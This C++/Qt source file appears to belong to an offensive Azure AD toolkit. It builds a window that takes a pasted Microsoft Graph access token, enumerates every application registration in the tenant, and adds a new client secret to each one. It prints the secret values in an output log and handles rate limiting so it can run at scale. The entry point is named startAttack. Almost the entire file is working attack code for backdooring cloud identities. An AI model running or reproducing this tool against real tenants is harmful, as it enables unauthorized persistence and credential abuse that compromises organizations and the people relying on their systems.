#include "AddAzADAppSecret.h"
#include "NetworkHelper.h"
#include <QByteArray>
#include <QDebug>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonParseError>
#include <QJsonValue>
#include <QMessageBox>
#include <QNetworkRequest>
#include <QScrollBar>
#include <QUrl>
#include <QUrlQuery>
#include <QTimer>

// ----------------------------------
// Constructor & UI
// ----------------------------------
AddAzADAppSecret::AddAzADAppSecret(QWidget *parent)
    : QWidget(parent), net(new QNetworkAccessManager(this)) {
    this->setWindowTitle("Add App Secret");
    this->resize(800, 720);

    QVBoxLayout *layout = new QVBoxLayout();

    layout->addWidget(new QLabel("Access Token (Microsoft Graph):"));
    tokenInput = new QLineEdit();
    tokenInput->setPlaceholderText("Paste Graph Access Token here...");
    layout->addWidget(tokenInput);

    startButton = new QPushButton("Add Secrets to Applications");
    connect(startButton, &QPushButton::clicked, this, &AddAzADAppSecret::startAttack);
    layout->addWidget(startButton);

    layout->addWidget(new QLabel("Output Log:"));
    outputBox = new QTextEdit();
    outputBox->setReadOnly(true);
    layout->addWidget(outputBox);

    this->setLayout(layout);
}

// ----------------------------------
// Utility: log to output box
// ----------------------------------
void AddAzADAppSecret::log(const QString &text) {
    outputBox->append(text);
    outputBox->verticalScrollBar()->setValue(outputBox->verticalScrollBar()->maximum());
}

// ----------------------------------
// Start Attack
// ----------------------------------
void AddAzADAppSecret::startAttack() {
    QString token = tokenInput->text().trimmed();
    if (token.isEmpty()) {
        QMessageBox::warning(this, "Missing Token", "Please paste a Graph access token first.");
        return;
    }

    if (!parseJwtAud(token).contains("graph.microsoft.com", Qt::CaseInsensitive)) {
        QMessageBox::warning(this, "Warning", "This token does not appear to be for Microsoft Graph!");
        return;
    }

    // Disable button during async operation
    startButton->setEnabled(false);
    startButton->setText("Adding secrets...");
    outputBox->clear();
    pendingRequests = 0;

    currentToken = token;
    log("[*] Enumerating applications via Microsoft Graph...");
    listApps(token);
}

// ----------------------------------
// List Applications
// ----------------------------------
void AddAzADAppSecret::listApps(const QString &token) {
    QNetworkRequest req = NetworkHelper::createBearerRequest(
        "https://graph.microsoft.com/v1.0/applications", token);

    QNetworkReply *rep = net->get(req);
    if (!rep) {
        log("[-] Failed to create network request");
        startButton->setEnabled(true);
        startButton->setText("Add Secrets to Applications");
        return;
    }
    connect(rep, &QNetworkReply::finished, this, &AddAzADAppSecret::handleListAppsReply);
}

void AddAzADAppSecret::handleListAppsReply() {
    QNetworkReply *rep = qobject_cast<QNetworkReply *>(sender());
    if (!rep) return;

    if (NetworkHelper::isThrottled(rep)) {
        int retryMs = NetworkHelper::getRetryAfterMs(rep);
        log(QString("[!] Rate limited (HTTP 429) while listing apps - retry after %1ms").arg(retryMs));
        startButton->setEnabled(true);
        startButton->setText("Add Secrets to Applications");
        rep->deleteLater();
        return;
    }

    QString errorMsg;
    if (!NetworkHelper::isReplySuccess(rep, &errorMsg)) {
        log("[-] Failed to enumerate applications: " + NetworkHelper::parseApiError(rep));
        startButton->setEnabled(true);
        startButton->setText("Add Secrets to Applications");
        rep->deleteLater();
        return;
    }

    QJsonObject obj = QJsonDocument::fromJson(rep->readAll()).object();
    rep->deleteLater();

    applications.clear();
    QJsonArray arr = obj.value("value").toArray();
    for (const auto &v : arr) {
        applications.append(v.toObject());
    }

    if (applications.isEmpty()) {
        log("❌ No applications found.");
        startButton->setEnabled(true);
        startButton->setText("Add Secrets to Applications");
        return;
    }

    currentIndex = 0;
    pendingRequests = applications.size();

    log(QString("[*] Processing %1 application(s) with 200ms delay between requests...").arg(applications.size()));
    processNextApp();
}

// ----------------------------------
// Process Next App (serialized with delay)
// ----------------------------------
void AddAzADAppSecret::processNextApp() {
    if (currentIndex >= applications.size()) {
        startButton->setEnabled(true);
        startButton->setText("Add Secrets to Applications");
        log("[*] Done processing all applications.");
        return;
    }

    const QJsonObject &app = applications[currentIndex];
    QString appId = app.value("id").toString();
    QString appName = app.value("displayName").toString();
    QString appAppId = app.value("appId").toString();
    log(QString("[*] [%1/%2] Adding password to: %3 (%4)")
        .arg(currentIndex + 1).arg(applications.size()).arg(appName, appAppId));
    addPassword(currentToken, appId, appName, appAppId);
}

// ----------------------------------
// Add Password to App
// ----------------------------------
void AddAzADAppSecret::addPassword(const QString &token,
                                   const QString &appId,
                                   const QString &appName,
                                   const QString &appAppId) {
    Q_UNUSED(appAppId);
    QString url = QString("https://graph.microsoft.com/v1.0/applications/%1/addPassword").arg(appId);

    QNetworkRequest req = NetworkHelper::createBearerRequest(url, token);

    // Request body
    QJsonObject body{
        { "passwordCredential", QJsonObject{ { "displayName", "Password" } } }
    };
    QByteArray data = QJsonDocument(body).toJson(QJsonDocument::Compact);

    QNetworkReply *rep = net->post(req, data);
    if (!rep) {
        log(QString("    [-] Failed to create request for: %1").arg(appName));
        pendingRequests--;
        currentIndex++;
        // Schedule next app with delay
        QTimer::singleShot(200, this, &AddAzADAppSecret::processNextApp);
        return;
    }
    connect(rep, &QNetworkReply::finished, this, [this, rep, appName]() {
        if (NetworkHelper::isThrottled(rep)) {
            int retryMs = NetworkHelper::getRetryAfterMs(rep);
            log(QString("    [!] Rate limited (HTTP 429) on %1 - retrying after %2ms").arg(appName).arg(retryMs));
            rep->deleteLater();
            // Retry same index after the retry-after delay
            QTimer::singleShot(retryMs, this, &AddAzADAppSecret::processNextApp);
            return;
        }

        if (!NetworkHelper::isReplySuccess(rep)) {
            log(QString("    [-] Failed to add secret: %1").arg(NetworkHelper::parseApiError(rep)));
        } else {
            const QJsonObject result = QJsonDocument::fromJson(rep->readAll()).object();
            log("    [+] Secret added: " + result.value("secretText").toString());
            log("    Key ID: " + result.value("keyId").toString() + "\n");
        }
        rep->deleteLater();

        pendingRequests--;
        currentIndex++;
        // Schedule next app with 200ms delay to avoid rate limiting
        QTimer::singleShot(200, this, &AddAzADAppSecret::processNextApp);
    });
}

// ----------------------------------
// Parse JWT Audience
// ----------------------------------
QString AddAzADAppSecret::parseJwtAud(const QString &token) {
    QStringList parts = token.split('.');
    if (parts.size() != 3) return "";

    QByteArray payload = QByteArray::fromBase64(parts[1].toUtf8(), QByteArray::Base64UrlEncoding);
    QJsonParseError err;
    QJsonObject obj = QJsonDocument::fromJson(payload, &err).object();
    if (err.error != QJsonParseError::NoError) return "";

    return obj.value("aud").toString();
}
